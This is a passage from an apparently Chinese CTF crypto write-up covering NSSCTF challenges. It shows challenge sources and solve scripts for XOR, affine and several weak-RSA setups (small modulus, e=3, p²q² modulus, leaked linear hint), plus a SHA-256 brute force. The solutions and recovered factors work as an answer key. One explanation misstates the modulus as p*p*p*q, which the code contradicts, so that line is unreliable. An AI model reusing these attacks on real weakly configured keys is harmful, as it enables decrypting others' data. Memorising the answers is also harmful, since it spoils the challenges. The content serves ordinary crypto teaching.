os</span><br><span class="line"></span><br><span class="line">randBytes = [bytes_to_long(os.urandom(<span class="number">64</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;randBytes[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;b = <span class="subst">&#123;randBytes[<span class="number">0</span>] ^ randBytes[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;randBytes[<span class="number">1</span>] ^ randBytes[<span class="number">2</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;d = <span class="subst">&#123;m ^ randBytes[<span class="number">0</span>] ^ randBytes[<span class="number">1</span>] ^ randBytes[<span class="number">2</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">a = 1215421974111272707828609697064234072332368362928440865251897449605952163161176359366553487776268706107760670434157083936287598207881176904763353849369234</span></span><br><span class="line"><span class="string">b = 10533604054267448009117468094542127075826310122733511023911022436253583775790861879410728001403728088545946257902341417532648419689212361977221573357292618</span></span><br><span class="line"><span class="string">c = 6401236597601556248960570084212025183497657335932789785351897915858852832577623776212842429736547820800219382515052263929074210010546149322465536545021479</span></span><br><span class="line"><span class="string">d = 5711309307698496426409561761492698639489294806611133698231840146911562848869711567477706456972659368849642409039245400981517493100724067475248620536111560</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>一道异或题，d^c^a就是flag。</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">a = <span class="number">1215421974111272707828609697064234072332368362928440865251897449605952163161176359366553487776268706107760670434157083936287598207881176904763353849369234</span></span><br><span class="line">b = <span class="number">10533604054267448009117468094542127075826310122733511023911022436253583775790861879410728001403728088545946257902341417532648419689212361977221573357292618</span></span><br><span class="line">c = <span class="number">6401236597601556248960570084212025183497657335932789785351897915858852832577623776212842429736547820800219382515052263929074210010546149322465536545021479</span></span><br><span class="line">d = <span class="number">5711309307698496426409561761492698639489294806611133698231840146911562848869711567477706456972659368849642409039245400981517493100724067475248620536111560</span></span><br><span class="line">m = d^c^a</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h3 id="baby-rsa"><a href="#baby-rsa" class="headerlink" title="baby_rsa"></a>baby_rsa</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">q = getPrime(<span class="number">128</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(n,c)</span><br><span class="line"><span class="comment"># 62193160459999883112594854240161159254035770172137079047232757011759606702281</span></span><br><span class="line"><span class="comment"># 17331436837911040930486942133359735652484926528331507431552667656734821231501</span></span><br></pre></td></tr></table></figure><p>n可以直接用factor分解出p，q,然后一把梭就行。</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">62193160459999883112594854240161159254035770172137079047232757011759606702281</span></span><br><span class="line">c = <span class="number">17331436837911040930486942133359735652484926528331507431552667656734821231501</span></span><br><span class="line">p=<span class="number">234560843346150602519484260867514743467</span></span><br><span class="line">q=<span class="number">265147241000574873803071047177766359643</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h3 id="爱妃"><a href="#爱妃" class="headerlink" title="爱妃"></a>爱妃</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">message,a,b,m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([(i*a+b)%m <span class="keyword">for</span> i <span class="keyword">in</span> message])</span><br><span class="line"></span><br><span class="line">a,b = getrandbits(<span class="number">4</span>),getrandbits(<span class="number">8</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;encrypt(flag,a,b,<span class="number">1</span>&lt;&lt;<span class="number">8</span>)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = b&#x27;y\xba\xba\xea\xc7\x11\xc2\xc7\xcb\xd8ZV\xd8ZVp\xb1\xb1\xd8\x19\xa4V\xa4\x19\x8aM\xa83g\xd8&amp;\x19\xdc&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>仿射加密.竟然已经知道明文的形式是NSSCTF{或者nssctf{，先爆破a,b，getrandbits(n)是获得一个在0-2^n之间的随机数，直接做字典爆破。a，b出来后爆破flag即可。</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line">  </span><br><span class="line">ls1 = []</span><br><span class="line">ls2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">ls1.append(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">ls2.append(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;NSSCTF&#123;&quot;</span></span><br><span class="line">cipher = <span class="string">b&#x27;y\xba\xba\xea\xc7\x11\xc2\xc7\xcb\xd8ZV\xd8ZVp\xb1\xb1\xd8\x19\xa4V\xa4\x19\x8aM\xa83g\xd8&amp;\x19\xdc&#x27;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> ls1: <span class="comment">#爆破a和b</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> ls2:</span><br><span class="line">        s = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">            <span class="keyword">if</span> (a*flag[i] + b) % <span class="number">0x100</span> == cipher[i]:</span><br><span class="line">                s += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> s == <span class="number">7</span>:</span><br><span class="line">            <span class="built_in">print</span>(a,b)</span><br><span class="line">            <span class="comment">#13 131</span></span><br><span class="line">a,b = <span class="number">13</span>,<span class="number">131</span></span><br><span class="line">table = string.printable.encode() <span class="comment">#取ascii表</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cipher:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table: <span class="comment">#爆破flag</span></span><br><span class="line">        <span class="keyword">if</span> (a*i + b)%<span class="number">0x100</span> == c:</span><br><span class="line">            res += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(res)   </span><br></pre></td></tr></table></figure><h2 id="Week2-1"><a href="#Week2-1" class="headerlink" title="Week2"></a>Week2</h2><h3 id="RSA-again"><a href="#RSA-again" class="headerlink" title="RSA again"></a>RSA again</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">pad = <span class="keyword">lambda</span> x:x + <span class="built_in">bytes</span>([<span class="number">16</span> - <span class="built_in">len</span>(x)%<span class="number">16</span>] * (<span class="number">16</span> - <span class="built_in">len</span>(x)%<span class="number">16</span>))</span><br><span class="line">m = bytes_to_long(pad(flag))</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">r = getPrime(<span class="number">1024</span>)</span><br><span class="line">s = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">n1 = p*q</span><br><span class="line">n2 = r*s</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">0x3</span></span><br><span class="line">e2 = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">pow</span>(m,e1,n1)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m,e2,n2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n1 = <span class="subst">&#123;n1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n2 = <span class="subst">&#123;n2&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e1 = <span class="subst">&#123;e1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e2 = <span class="subst">&#123;e2&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c1 = <span class="subst">&#123;c1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c2 = <span class="subst">&#123;c2&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n1 = 19920284552214772740140135352548541831031690920425912140961436065508824546041514076016684238261995522677433833330399269923572993489681770913908642529489382472548548664350078176417366141695108301338793624641102311886122714705781923892243561473766978666116035403145672686443197319003393949350402512739343998236331447680561106899174404316265329944969786438022711742891334905159259854026408058542492105569778656883811323759583727586331462200020945101286801110840081277963013591342157754264111051785385892113635682519079401538045775697382691195557344630571694510115674941400112478156619785019370731073096018975390492287333</span></span><br><span class="line"><span class="string">n2 = 16329690193309629244191723145720681753145067517963214005637012320130767690248475184382159868590994476900972592910808281306311987027465355492106975220876976952805197358639881107619560544543352300924359258546945240852850094015390140482140815264345348655887196971643211396274684514779113163628885090661524523232327450873503097327714815509514869056066300689707819915660849896274673178482085029145101175879255721581466301617903290840675945809027289325795423671263820619585424051649443606301277124322653881307702397752575258862656767834175467463999624688529625582031941402015943516022965802189663157681884162493551612612033</span></span><br><span class="line"><span class="string">e1 = 3</span></span><br><span class="line"><span class="string">e2 = 65537</span></span><br><span class="line"><span class="string">c1 = 1752041777918702842605810950957832076618830231626916748933875881505173164404519153781007066742915517004902508987841695668088780745675304779496841107726530280651344357647334690721873124324358539328142005709830859468027528835981960873390785515876157664035579935532043154959183555353553164481674735512873428044452976229459806219115571797514157279125</span></span><br><span class="line"><span class="string">c2 = 13118485959563304540673377439664643422000629435115361166348221705991314239675693340024813013156594762061646798463551395329521013651893257141697813554253378348002502855822191264845788826850528723400519059095869424931054523865083127809240502348046515579012160733570975234405522250330692499687684922633627550243811524972452606330768418753137605045204137872122584136368073471612976975360656501198000053578279110813009137808852376287556012668702182416374333935081007133880603708035832346742292444210108820267460698390600228183548619401334969739679892562475501201965275739796687679445529050630235296740377171065357995433586</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>注意的是e1=3很小，低加密指数攻击。</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">c, e, n</span>):</span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mm = c + n*k</span><br><span class="line">        result, flag = gmpy2.iroot(mm, e)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">True</span> == flag:</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">n= <span class="number">19920284552214772740140135352548541831031690920425912140961436065508824546041514076016684238261995522677433833330399269923572993489681770913908642529489382472548548664350078176417366141695108301338793624641102311886122714705781923892243561473766978666116035403145672686443197319003393949350402512739343998236331447680561106899174404316265329944969786438022711742891334905159259854026408058542492105569778656883811323759583727586331462200020945101286801110840081277963013591342157754264111051785385892113635682519079401538045775697382691195557344630571694510115674941400112478156619785019370731073096018975390492287333</span></span><br><span class="line">e= <span class="number">3</span></span><br><span class="line">c= <span class="number">1752041777918702842605810950957832076618830231626916748933875881505173164404519153781007066742915517004902508987841695668088780745675304779496841107726530280651344357647334690721873124324358539328142005709830859468027528835981960873390785515876157664035579935532043154959183555353553164481674735512873428044452976229459806219115571797514157279125</span></span><br><span class="line"></span><br><span class="line">m=de(c,e,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)).decode())</span><br></pre></td></tr></table></figure><h3 id="strange-RSA"><a href="#strange-RSA" class="headerlink" title="strange RSA"></a>strange RSA</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">pad = <span class="keyword">lambda</span> x:x + <span class="built_in">bytes</span>([<span class="number">16</span> - <span class="built_in">len</span>(x)%<span class="number">16</span>] * (<span class="number">16</span> - <span class="built_in">len</span>(x)%<span class="number">16</span>))</span><br><span class="line">m = bytes_to_long(pad(flag))</span><br><span class="line">p = getPrime(<span class="number">100</span>)</span><br><span class="line">q = getPrime(<span class="number">100</span>)</span><br><span class="line">n = p*p*q*q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 564070152909085514893862673848191100242629745476416876533996976389897932324860687952230733393080567203972999049426141761</span></span><br><span class="line"><span class="string">c = 269509453821913281608300827585653465889617103481995203776655691658799441157871331220899710463748827149644657719450056013</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>值得注意的是<code>n=p*p*p*q</code>根据欧拉定理可以得到欧拉函数<code>phi = p*(p-1)*q*(q - 1)</code>。n直接factor爆破就能出p，q。</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">564070152909085514893862673848191100242629745476416876533996976389897932324860687952230733393080567203972999049426141761</span></span><br><span class="line">c = <span class="number">269509453821913281608300827585653465889617103481995203776655691658799441157871331220899710463748827149644657719450056013</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">709662686105519282917793669093</span> </span><br><span class="line">q = <span class="number">1058314117179226194777612760717</span></span><br><span class="line">phi = p*(p-<span class="number">1</span>)*q*(q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="solve-the-equation"><a href="#solve-the-equation" class="headerlink" title="solve_the_equation"></a>solve_the_equation</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">2048</span>)</span><br><span class="line">q = getPrime(<span class="number">2048</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">gift = <span class="number">2022</span> * p + <span class="number">9</span> * q + <span class="number">28</span> * e</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(n,c,gift)</span><br><span class="line"><span class="comment"># 559013759419746202691240598235115105126834606071307611491891982898293133657843987454339580258031532272691584368719342942404675509580909313170933925796189789232538297110756754383546447669571766593521267667716779348776308179675709803388978100416839504625045239819627379469827980589668625084314985969634985583431058156810528172627873121320455715399011186280324236548934145366222271636328254497851289112650375015433741699898290781472376090171361276557886637892800404830030548291487615566596504234212554381817510798554015481259307992175226543595948798873846335558746933940683482819439715578130806800536423771482474206047548549237879025655562739463111822524633757040958223066367993671472508367287181357997804485542311011003871312708995599690715923692968372474814753669031805664070760705148563294700043336457334028810890271434599241312612447640877347296648737167576464851763570272180801042067934843953206083053874624644994067168364645748243999074053494066054657595233970985982095621265309066132852511490426399921749091156312387594448586826952283581592003247165562367202134878625798756167825941929996806801073247649667626854029875184014003650020610359836971629737204456239324237077361643697429780638179887750984791035339697744210904151734797</span></span><br><span class="line"><span class="comment"># 73407318923483936681380982096598838839602514018601041044571793373013418096970487001956204920233481604663088115926046001478564679328045899017826536373925483312496867862798918521256833686293905627264784839084309695013473729502056597198558911052248943918139429481528120149662544426266704140382476129564563832751550189116712164319522536680400998100426969878312141399338984622535922004572374724499994480294086487511972287034778386491943792466926044305651852709046949243652756946391206931252732067537917128777152678266816232179411054474713462051435447023851233892017069674808619784767176865947753180156093197684363218543237706358137237603822953178987601908200096630034921280599733190041134038060644827637374731999991143342404380959195318030935855850625849684867326087432054830971960076859722417639414733054394674533018860606074648324450983897579183842853010968597034663149214229791831193351337193195298921766564073265470525286769595835642479920483047959570057149110246705969802722576770273329236163660486942433423522588321736639231667766680582482974393228214947178327111783901303686854030864244720750585928819691608599558058859371899416709995780300197269497143959726959313506292966639680257096421491364629690813416340577056873916752193925</span></span><br><span class="line"><span class="comment"># 63829120016023768052886024054478552450378183173692549289836790500844466624984770449526584263524969873611417764466777251459739549064993441916734929304056657281688756040121378172997367361118927461471925755841160032723693319039128805185488328610549652307644061769088611063117016010827595409949224043526660999362737741312450095192593608666286680915796697255817583078927076945852260612453896867746751729217633935143780193497702898684210698859292191506586139420497299988065973759272644964857853100511651254633164029275099534568064491202987945733565755982565356202756330311841048849063747767451397616638500281324618902190280761</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>解方程，直接sympy库解非线性方程组，有俩解，取整数解那个即可。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">559013759419746202691240598235115105126834606071307611491891982898293133657843987454339580258031532272691584368719342942404675509580909313170933925796189789232538297110756754383546447669571766593521267667716779348776308179675709803388978100416839504625045239819627379469827980589668625084314985969634985583431058156810528172627873121320455715399011186280324236548934145366222271636328254497851289112650375015433741699898290781472376090171361276557886637892800404830030548291487615566596504234212554381817510798554015481259307992175226543595948798873846335558746933940683482819439715578130806800536423771482474206047548549237879025655562739463111822524633757040958223066367993671472508367287181357997804485542311011003871312708995599690715923692968372474814753669031805664070760705148563294700043336457334028810890271434599241312612447640877347296648737167576464851763570272180801042067934843953206083053874624644994067168364645748243999074053494066054657595233970985982095621265309066132852511490426399921749091156312387594448586826952283581592003247165562367202134878625798756167825941929996806801073247649667626854029875184014003650020610359836971629737204456239324237077361643697429780638179887750984791035339697744210904151734797</span></span><br><span class="line">c = <span class="number">73407318923483936681380982096598838839602514018601041044571793373013418096970487001956204920233481604663088115926046001478564679328045899017826536373925483312496867862798918521256833686293905627264784839084309695013473729502056597198558911052248943918139429481528120149662544426266704140382476129564563832751550189116712164319522536680400998100426969878312141399338984622535922004572374724499994480294086487511972287034778386491943792466926044305651852709046949243652756946391206931252732067537917128777152678266816232179411054474713462051435447023851233892017069674808619784767176865947753180156093197684363218543237706358137237603822953178987601908200096630034921280599733190041134038060644827637374731999991143342404380959195318030935855850625849684867326087432054830971960076859722417639414733054394674533018860606074648324450983897579183842853010968597034663149214229791831193351337193195298921766564073265470525286769595835642479920483047959570057149110246705969802722576770273329236163660486942433423522588321736639231667766680582482974393228214947178327111783901303686854030864244720750585928819691608599558058859371899416709995780300197269497143959726959313506292966639680257096421491364629690813416340577056873916752193925</span></span><br><span class="line">gift = <span class="number">63829120016023768052886024054478552450378183173692549289836790500844466624984770449526584263524969873611417764466777251459739549064993441916734929304056657281688756040121378172997367361118927461471925755841160032723693319039128805185488328610549652307644061769088611063117016010827595409949224043526660999362737741312450095192593608666286680915796697255817583078927076945852260612453896867746751729217633935143780193497702898684210698859292191506586139420497299988065973759272644964857853100511651254633164029275099534568064491202987945733565755982565356202756330311841048849063747767451397616638500281324618902190280761</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">p,q = symbols(<span class="string">&#x27;p q&#x27;</span>)</span><br><span class="line">resture = nonlinsolve([p*q - n, <span class="number">2022</span> * p + <span class="number">9</span> * q + <span class="number">28</span> * e - gift], [p, q])</span><br><span class="line"><span class="built_in">print</span>(resture)</span><br></pre></td></tr></table></figure><p>p，q出了，RSA一把梭就行了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = 31488299927163782375594305784598354985055343576902151378139638110290196067918972709864013036909993584566357500427488971564319756822589646977081872239028723217808372250207143372686512583814138881980368846428364451724191019810210583450208745323418623199057207740178726519465136933610452840086315545766227500114368026151391214297362847972215483754128409704386255997220347329566039222555930464490406419002226257326118774942404683970363544788642504594073256844610344691049585870560973659315882902006631997716334351866723219577903275769313404136367236735062099234386473703566068495328080598914833401280780692803508570349879</span><br><span class="line">q = 17753062588733343270481973113408741177364273466266578137604693537521130628067514464616655876995871735360322066932727884076111196635241747675042626304508770586691927800281585936137657405193182456402216484778567926375452998098111716574027285177466244350043079827469560084278792340806640810521556665260999347942843603815228875925103340718552529438783648172063716949726071718858811605089496505238883332792493647818670062684514188459512366295227468596668231188353669195967903222039580635681985850471261694526218866731687175727118621937360285536800367141087950091875609247828705723374310716178275472084635608436063660110043</span><br></pre></td></tr></table></figure><h3 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h3><p><img src="https://s2.loli.net/2023/08/04/wneuaFGNLryWcEi.png" alt="image-20221021105716950.png"></p><p>sha256爆破前四位。</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits, ascii_letters, punctuation</span><br><span class="line">alpha_bet=digits+ascii_letters+punctuation</span><br><span class="line">strlist = itertools.product(alpha_bet, repeat=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">sha256=<span class="string">&quot;1dafe94b2a853521de7c2ef475c88dc446b9a92b67189d4f0905ecad71b2acef&quot;</span></span><br><span class="line">tail=<span class="string">&quot;aW56dn5niWISJkBo&quot;</span></span><br><span 